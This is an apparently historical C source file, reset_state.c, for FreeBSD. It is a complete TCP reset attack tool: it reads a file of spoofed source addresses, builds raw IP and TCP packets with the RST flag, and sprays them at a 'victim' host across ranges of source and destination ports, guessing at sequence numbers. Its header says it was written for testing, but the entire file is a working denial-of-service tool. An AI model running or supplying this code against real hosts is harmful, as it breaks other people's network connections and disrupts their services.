/* reset_state.c (c) 2000 Citec Network Securities */
/* The code following below is copyright Citec Network Securities */
/* Code was developed for testing, and is written to compile under */
/* FreeBSD */

#define __BSD_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>

struct slist {
	struct in_addr  spoof;
	struct slist   *link;
};					/* Spoof list */

int
main(int argc, char *argv[])
{

	int i, int2;
	int             sock;		/* Socket stuff */
	int             on = 1;		/* Socket stuff */
	struct sockaddr_in sockstruct;	/* Socket stuff */
	struct ip      *iphead;		/* IP Header pointer */
	struct tcphdr  *tcphead;	/* TCP Header pointer */
	char            evilpacket[sizeof(struct ip) + sizeof(struct
tcphdr)];
					/* Our reset packet */
	int             seq, ack;	/* Sequence and Acknowledgement #'s
*/
	FILE           *spooffile;	/* Spoof file */
	char           *buffer;		/* Spoof file read buffer */
	struct slist   *scur, *sfirst;	/* Spoof linked list pointers */
	char src[20], dst[20];		/* Work around for inet_ntoa static
*/
					/* Pointers when using printf() */
	int sourcefrom, sourceto, destfrom, destto;	/* CMD Line ports */
	int target;			/* Target address from inet_addr()
*/


	if(argc < 6) {
		fprintf(stderr, "Usage: %s spoof_file target sps spe dps
dpe\n"
		"target = your victim\n"
		"sps = Source port start\n"
		"spe = Source port end\n"
		"dps = Destination port start\n"
		"dpe = Destination port end\n", argv[0]);
		exit(-1);
		}
	else {
		sourcefrom = atoi(argv[3]);
		sourceto = atoi(argv[4]);
		destfrom = atoi(argv[5]);
		destto = atoi(argv[6]);
		};
	
	if(sourcefrom > sourceto) {
		printf("Error, start source port must be less than end
source port\n");
		exit(-1);
		}
	else if(destfrom > destto) {
		printf("Error, start dest port must be less than end dest
port\n");
		exit(-1);
		};

	printf("Used spoof file %s\n"
	       "Destination: [%s] ports: [%d -> %d]\n"
	       "Target source ports: [%d -> %d]\n",
		argv[1], argv[2], destfrom, destto, sourcefrom, sourceto);

	sleep(1);

	bzero(evilpacket, sizeof(evilpacket));
					/* Clean our reset packet */

	sfirst = malloc(sizeof(struct slist));
	scur = sfirst;
	scur->link = NULL;		/* Setup our spoof linked list */

	if(!(buffer = malloc(25))) {
		perror("malloc");
		exit(-1);
		};			/* Allocate for read buffer */

	if ((spooffile = fopen((char *) argv[1], "r")) <= 0) {
		perror("fopen");
		exit(-1);		/* Open our spoof file */
	} else {
		while (fgets(buffer, 25, spooffile)) { 	/* Read till EOF */
			if (!(inet_aton(buffer, &(scur->spoof))))
				printf("Invalid address found in victim
file.. ignoring\n");
			else {
				scur->link = malloc(sizeof(struct slist));
				scur = scur->link;
				scur->link = NULL;	/* Cycle l.list */
				}
			};		/* End of while loop */
		};		/* End of if {} else {} */
	

	free(buffer);			/* Free up our read buffer */
	fclose(spooffile);		/* Close our spoof file */
	scur = sfirst;			/* Set spoof list current to first
*/

	if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket");
		exit(-1);
	}				/* Allocate our raw socket */

	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *) &on,
sizeof(on)) < 0) {
		perror("setsockopt");
		exit(-1);
	}				/* Set socket options for raw iphead
*/

	sockstruct.sin_family = AF_INET;
	iphead = (struct ip *) evilpacket;
	tcphead = (struct tcphdr *) (evilpacket + sizeof(struct ip));
					/* Align ip and tcp headers */

	iphead->ip_hl = 5;		/* Ip header length is 5 */
	iphead->ip_v = 4;		/* ipv4 */
	iphead->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
					/* Length of our total packet */
	iphead->ip_id = htons(getpid());	/* Packet ID == PID # */
	iphead->ip_ttl = 255;			/* Time to live == 255 */
	iphead->ip_p = IPPROTO_TCP;		/* TCP Packet */
	iphead->ip_sum = 0;			/* No checksum */
	iphead->ip_tos = 0;			/* 0 Type of Service */
	iphead->ip_off = 0;			/* Offset is 0 */
	tcphead->th_win = htons(512);		/* TCP Window is 512 */
	tcphead->th_flags = TH_RST;		/* Reset packet */
	tcphead->th_off = 0x50;			/* TCP Offset 0x50 */

	iphead->ip_dst.s_addr = inet_addr(argv[2]);

	srand(getpid());			/* Seed for rand() */
	while (scur->link != NULL) {
		seq = rand() % time(NULL);	/* Randomize our #'s */
		ack = rand() % time(NULL);	/* Randomize ack #'s */
		sockstruct.sin_port = htons(rand() % time(NULL));
		iphead->ip_src = scur->spoof;	/* Set the spoofed address
*/
		sockstruct.sin_addr = scur->spoof;
		for(i = sourcefrom; i <= sourceto; i++) {
			for(int2 = destfrom; int2 <= destto; int2++) {
				usleep(2);	/* Sleep 5ms between packets
*/
				seq += (rand() %10)+250;
				ack += (rand() %10)+250;
				tcphead->th_seq = htonl(seq);
						/* Set sequence number */
				tcphead->th_ack = htonl(ack);
						/* Set ack number */
				tcphead->th_dport = htons(int2);
						/* Set destination port */
				tcphead->th_sport = htons(i);
						/* Set source port */
				snprintf(src, 20, "%s",
inet_ntoa(iphead->ip_src));
				snprintf(dst, 20, "%s",
inet_ntoa(iphead->ip_dst));
				/* Copy info to src and dst for printing */
				printf("TCP RESET: [%s:%d] -> [%s:%d]\n",
src, ntohs(tcphead->th_sport), dst, ntohs(tcphead->th_dport));
				sendto(sock, &evilpacket,
sizeof(evilpacket), 0x0,
			       		(struct sockaddr *) & sockstruct,
sizeof(sockstruct));
						/* Send our evil packet */
				};
			};
		scur = scur->link;		/* Cycle the spoof ips */
		}
		scur = sfirst;
	return (1);

};













